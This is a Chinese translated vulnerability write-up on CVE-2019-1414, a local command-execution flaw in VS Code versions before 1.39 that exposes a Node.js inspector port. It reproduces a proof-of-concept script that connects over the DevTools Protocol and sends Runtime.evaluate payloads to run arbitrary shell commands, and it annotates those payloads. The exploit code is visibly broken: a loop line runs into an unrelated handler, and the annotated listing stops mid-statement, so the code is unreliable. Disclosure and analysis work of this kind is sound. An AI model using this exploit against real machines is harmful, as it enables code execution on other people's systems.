# Visual Studio Code本地代码执行漏洞(CVE-2019-1414)
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 背景
​ 微软在2015年推出的跨平台开源编辑器Visual Studio Code（VS
Code），凭借其开箱即用的便捷以及丰富的插件社区，迅速吸引了大批用户。在最新的PYPL
IDE[排行榜](http://pypl.github.io/IDE.html)中，VS Code已位列第六，并且仍处于上升趋势。
​ 几个月前，国外安全研究员[Tavis Ormandy](https://twitter.com/taviso)发现并提交了VS
Code中的一个本地命令执行漏洞(CVE-2019-1414)，并于最近披露。1.39版本之前的VS Code受此漏洞影响。
## 漏洞分析与复现
可以在[这里](https://code.visualstudio.com/updates/v1_38)找到老版本的vscode安装包，各个操作系统版本的都有，这里使用1.38
mac版本进行演示。
打开下载的vscode。通过ps可以看到，vscode默认开启了一个node js调试端口(`--inspect=13611`)。
    $ ps aux |grep inspect
    ch               95536   0.0  0.7  4815292  56884   ??  S     9:59上午   0:03.49 /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper --nolazy --inspect=13611 /private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Resources/app/out/bootstrap-fork --type=extensionHost
    ch               95748   0.0  0.0  4286472    840 s003  S+   10:42上午   0:00.01 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn inspect
我们可以通过api查看调试端口的信息：
    $ curl http://127.0.0.1:13611/json
    [ {
      "description": "node.js instance",
      "devtoolsFrontendUrl": "chrome-devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f",
      "devtoolsFrontendUrlCompat": "chrome-devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f",
      "faviconUrl": "https://nodejs.org/static/favicon.ico",
      "id": "09d445a2-c4ad-4082-b4ab-36de37ff910f",
      "title": "/private/var/folders/s7/yz190r8s1q1c07_dbl4z40dm0000gn/T/AppTranslocation/8D63CA2B-3DB2-4150-AE36-59BC8B6475DB/d/Visual Studio Code.app/Contents/Frameworks/Code Helper.app/Contents/MacOS/Code Helper[95536]",
      "type": "node",
      "url": "file://",
      "webSocketDebuggerUrl": "ws://127.0.0.1:13611/09d445a2-c4ad-4082-b4ab-36de37ff910f"
    } ]
在chrome中直接打开`devtoolsFrontendUrl`指向的链接，就可以得到一个浏览器调试终端，可以在里面执行js指令。  
漏洞作者给出的poc如下：
    //poc.js
    const fetch = require('node-fetch')
    const WebSocket = require('ws')
    function die (reason) {
      console.error(reason)
      process.exit(-1)
    }
    if (process.argv.length !== 5) {
      die('usage: node index.js   ')
    }
    const IP = process.argv[2]
    const PORT = process.argv[3]
    const COMMAND = process.argv[4]
    const COMMAND_B64 = base64(COMMAND)
    function base64 (data) {
      return Buffer.from(data).toString('base64')
    }
    async function getWsLink () {
      const res = await fetch(`http://${IP}:${PORT}/json`)
      const data = await res.json()
      return data[0].webSocketDebuggerUrl
    }
    async function main () {
      console.log(`[?] Getting webSocketDebuggerUrl from http://${IP}:${PORT}/json`)
      const wsLink = await getWsLink().catch(die)
      console.log(`[!] Found webSocketDebuggerUrl: ${wsLink}`)
      const socket = new WebSocket(wsLink)
      socket.onopen = async (event) => {
        console.log(`[?] Connection established to ${wsLink}`)
        socket.send(JSON.stringify({ id: 1, method: 'Runtime.enable' }))
        socket.send(JSON.stringify({
          id: 1,
          method: 'Runtime.evaluate',
          params: {
            expression: `spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}`
          }
        }))
        socket.send(JSON.stringify({
          id: 2,
          method: 'Runtime.evaluate',
          params: {
            expression: `spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c {
        // console.log(event)
      }
      socket.onclose = (event) => {
        // console.log(event)
        if (event.wasClean) {
          console.log('[?] Connection closed cleanly')
        } else {
          console.log('[?] Connection died')
        }
      }
      socket.onerror = (error) => {
        console.log(error)
      }
    }
    main()
运行命令是`node poc.js [HOST] [PORT] [CMD]`  
我用下面的命令尝试了几次都没有成功往/tmp/a中写入东西，于是开始着手分析poc代码。
    node poc.js 127.0.0.1 13611 "pwd >/tmp/a"
    cat /tmp/a
getWsLink函数通过访问`http://127.0.0.1:13611/json`拿到webSocketDebuggerUrl。之后这个url被用来进行websocket连接。
    async function getWsLink () {
      const res = await fetch(`http://${IP}:${PORT}/json`)
      const data = await res.json()
      return data[0].webSocketDebuggerUrl
    }
建立websocket连接之后发送了4个数据包，这种数据包的协议是`Chrome DevTools Protocol`，大致结构是这样的：
    {
      id: 1,
      method: 'xxx',
      params: {} //可选
    }
这种协议一般用来调试和优化Chromium, Chrome浏览器，查阅文档后找到了poc中使用的两种method的相关信息。
可以看到两种method都在Runtime Domain分类下面，Runtime Domain把Javascript
runtime暴露在远程连接中，且命令执行副作用持久化。`Runtime.enable`使能执行环境、`Runtime.evaluate`用来执行具体命令。
之后就需要知道发送的这几个expression里面有什么，把几个包中的expression展开、[美化](https://beautifier.io/)之后，可以看的更清晰一些：
    // id=2
    spawn_sync = process.binding('spawn_sync');
    normalizeSpawnArguments = function(c, b, a) { //解析参数，c:process, b:args, a:options
        if (Array.isArray(b) ? b = b.slice(0) : (a = b, b = []), a === undefined && (a = {}), a = Object.assign({}, a), a.shell) {
            const g = [c].concat(b).join(' ');
            typeof a.shell === 'string' ? c = a.shell : c = '/bin/sh', b = ['-c', g];
        }
        typeof a.argv0 === 'string' ? b.unshift(a.argv0) : b.unshift(c);
        var d = a.env || process.env;
        var e = [];
        for (var f in d) e.push(f + '=' + d[f]); //加入环境变量
        return {
            file: c,
            args: b,
            options: a,
            envPairs: e
        };
    }
    // id=3
    spawnSync = function() { //主函数，用来执行命令
        var d = normalizeSpawnArguments.apply(null, arguments); 
        // arguments是函数的参数，https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments
        var a = d.options;
        var c;
        if (a.file = d.file, a.args = d.args, a.envPairs = d.envPairs, a.stdio = [{
                type: 'pipe',
                readable: !0,
                writable: !1
            }, {
                type: 'pipe',
                readable: !1,
                writable: !0
            }, {
                type: 'pipe',
                readable: !1,
                writable: !0
            }], a.input) {
            var g = a.stdio[0] = util._extend({}, a.stdio[0]);
            g.input = a.input;
        }
        for (c = 0; c 